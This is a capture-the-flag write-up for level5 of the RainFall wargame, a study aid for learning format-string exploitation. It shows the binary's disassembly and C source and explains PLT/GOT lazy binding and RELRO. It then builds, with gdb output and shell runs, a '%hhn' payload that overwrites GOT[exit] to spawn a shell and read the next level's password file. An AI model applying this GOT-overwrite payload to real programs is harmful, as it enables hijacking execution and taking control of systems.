
# Source Code

<table  style="margin: 0 auto;">
  <tr>
    <th>Assembly Code</th>
    <th>C Code</th>
  </tr>
  <tr>
    <td>
      <pre><code class="language-asm">
Dump of assembler code for function main:
   0x08048504 <+0>:     push   ebp
   0x08048505 <+1>:     mov    ebp,esp
   0x08048507 <+3>:     and    esp,0xfffffff0
   0x0804850a <+6>:     call   0x80484c2 n
   0x0804850f <+11>:    leave
   0x08048510 <+12>:    ret

Dump of assembler code for function n:
   0x080484c2 <+0>:     push   ebp
   0x080484c3 <+1>:     mov    ebp,esp
   0x080484c5 <+3>:     sub    esp,0x218
   0x080484cb <+9>:     mov    eax,ds:0x8049848
   0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:    lea    eax,[ebp-0x208]
   0x080484e2 <+32>:    mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    eax,[ebp-0x208]
   0x080484f0 <+46>:    mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>

Dump of assembler code for function o:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x18
   0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:    call   0x8048390 <exit@plt>
      </code></pre>
    </td>
    <td>
      <pre><code class="language-c">
void o()
{
  system("/bin/sh");
  exit(1);
}

void n()
{
  char buffer[520];

  fgets(buffer, 512, stdin);
  printf(buffer);
  exit(1);
}

int main()
{
  n();
}
      </code></pre>
    </td>
  </tr>
</table>


# Exploring

Like level before, no buffer overflow, only vulnerable `printf` format string.

Unlike before there is no variable shall change its value to gain shell access.

Wait, now we return think about stack overflow by override stored `EIP` register on the stack.

override them with `o` function address that's run `/bin/sh` for us.


unfortunately, will not work due `exit(1)` after `printf` immediately.

We need to think about other technique.


---

### PLT (Procedure Linkage Table)
- **Purpose**: Resolve addresses of external functions (e.g., `printf`, `execve`) during runtime (lazy binding).
- **Behavior**:
  - On the **first call** to a function (e.g., `puts`), the PLT redirects to the dynamic linker (`ld`) to resolve the function’s address.
  - On **subsequent calls**, the PLT jumps directly to the resolved address (via GOT).


### GOT (Global Offset Table)
- **Purpose**: Acts as a "jump table" storing absolute addresses of resolved functions.
- **Behavior**:
  - Initially, GOT entries point back to the PLT to trigger resolution.
  - After resolution, GOT entries hold the **actual address** of the function (e.g., `libc` address of `puts`).


### Visualization: `call puts@plt` Flow


#### First Call (Unresolved):
```
Program → PLT[puts] → GOT[puts] (points back to PLT)
                      ↓
                   Dynamic linker (`ld`) resolves `puts` address
                      ↓
                   GOT[puts] updated to `0x7ffff7e65900` (real `puts` in libc)
```


#### Subsequent Calls (Resolved):
```
Program → PLT[puts] → GOT[puts] (now `0x7ffff7e65900`) → Execute `puts`
```


### Exploitation Relevance
- **GOT Overwrite**: If an attacker can **write to GOT** (e.g., via buffer overflow), they can redirect execution when the function is called.
  - Example: Overwrite `GOT[puts]` with `system` address → `puts("hello")` becomes `system("hello")`.
- **Protections**: 
  - **RELRO** (Relocation Read-Only): 
    - **Partial RELRO** (default): GOT is writable.
    - **Full RELRO**: GOT is read-only (blocks this exploit).


### ASCII Diagram
```
+----------------+       +----------------+       +----------------+
|   Program      |       |     PLT        |       |      GOT       |
|----------------|       |----------------|       |----------------|
| call puts@plt  | ----> | jmp *GOT[puts] | ----> | 0x7ff... (libc)|
+----------------+       +----------------+       +----------------+
                                |                     ^
                                v                     |
                         (First call only)            |
                        +----------------+            |
                        |  Dynamic Linker| -----------+
                        +----------------+
```


I highly recomend to watch this video https://www.youtube.com/watch?v=RtAYxBtpO20 for more.

---


# Exploiting


Now we have an idea, is write to **GOT** table to control/redirect execution flow.


The target function to be overridden with `o` function is `exit` that come after `printf`.

We need to get address of `exit` on **GOT** table (`GOT[exit]`).


```
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
=> 0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
gdb-peda$ x/3i 0x80483d0
   0x80483d0 <exit@plt>:        jmp    DWORD PTR ds:0x8049838   <- GOT[exit]
   0x80483d6 <exit@plt+6>:      push   0x28                     <- 2nd ins in PLT[exit] (0x80483d6)
   0x80483db <exit@plt+11>:     jmp    0x8048370
gdb-peda$ x/wx 0x8049838
0x8049838 <exit@got.plt>:       0x080483d6  <- the GOT[exit] has the address of "2nd ins in PLT[exit]": mean call back to PLT[exit]
```

So, the target address is `0x8049838` (`GOT[exit]`), and shall overridden by address of `o` (`0x080484a4`, which is `134513828` in decimal).


Like level before, first thing, we shall break down the `134513828` to binary and bytes.

```
byte-no   0        1        2        3
binary    00001000 00000100 10000100 10100100
decimal      8       4        132      164
```

In little-Endian

```
address   0        1        2        3
binary    10100100 10000100 00000100 00001000
decimal     164      132       4        8
```

From binary representation, we shall start writing lower to high decimals, `4`, `8`, `132` then `164`.

the payload be like:

```
....%22$hhn....%33$hhn%124x%11$hhn%32x%00$hhn..padding..2222333311110000
     ^^         ^^          ^^         ^^      ^^^^^^^
```

Now, we need to get `22` arg number to match **2222** and the padding

```
level5@RainFall:~$ for i in {13..21}; do echo -n "$i:  "; echo "....%$i"'$08x....%00$08x%008x%00$08x%08x%00$08x...2222333311110000' | ./level5; done
13:  ....30257838....%0$08x00000200%0$08xb7fd1ac0%0$08x...2222333311110000
14:  ....38302430....%0$08x00000200%0$08xb7fd1ac0%0$08x...2222333311110000
15:  ....2e2e2e78....%0$08x00000200%0$08xb7fd1ac0%0$08x...2222333311110000
16:  ....32323232....%0$08x00000200%0$08xb7fd1ac0%0$08x...2222333311110000
17:  ....33333333....%0$08x00000200%0$08xb7fd1ac0%0$08x...2222333311110000
18:  ....31313131....%0$08x00000200%0$08xb7fd1ac0%0$08x...2222333311110000
19:  ....30303030....%0$08x00000200%0$08xb7fd1ac0%0$08x...2222333311110000
20:  ....0000000a....%0$08x00000200%0$08xb7fd1ac0%0$08x...2222333311110000
21:  ....0000000b....%0$08x00000200%0$08xb7fd1ac0%0$08x...2222333311110000

# -> from our observation, the number of arg is 16, so:

level5@RainFall:~$ echo '....%16$08x....%00$08x%008x%00$08x%08x%00$08x...2222333311110000' | ./level5
....32323232....%0$08x00000200%0$08xb7fd1ac0%0$08x...2222333311110000

# -> 32323232 (hex) -> 2222 (ascii)

```

Now, replace `2222 .....` with target address `0x8049838` changed to little-endian.

```
2222 -> \x3a\x98\x04\x08
3333 -> \x3b\x98\x04\x08
1111 -> \x39\x98\x04\x08
0000 -> \x38\x98\x04\x08
```

the final payload is:

```
....%16$hhn....%17$hhn%124x%18$hhn%32x%19$hhn...\x3a\x98\x04\x08\x3b\x98\x04\x08\x39\x98\x04\x08\x38\x98\x04\x08

```

Output:

```
level5@RainFall:~$ (echo -n '....%16$hhn....%17$hhn%124x%18$hhn%32x%19$hhn...'; printf '\x3a\x98\x04\x08\x3b\x98\x04\x08\x39\x98\x04\x08\x38\x98\x04\x08\n'; cat) | ./level5
........                                                                                                                         200                        b7fd1ac0...8
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

if you find something confusing, Please back to previous challenge.

Our job ends here, see you in the next level (`level6`).
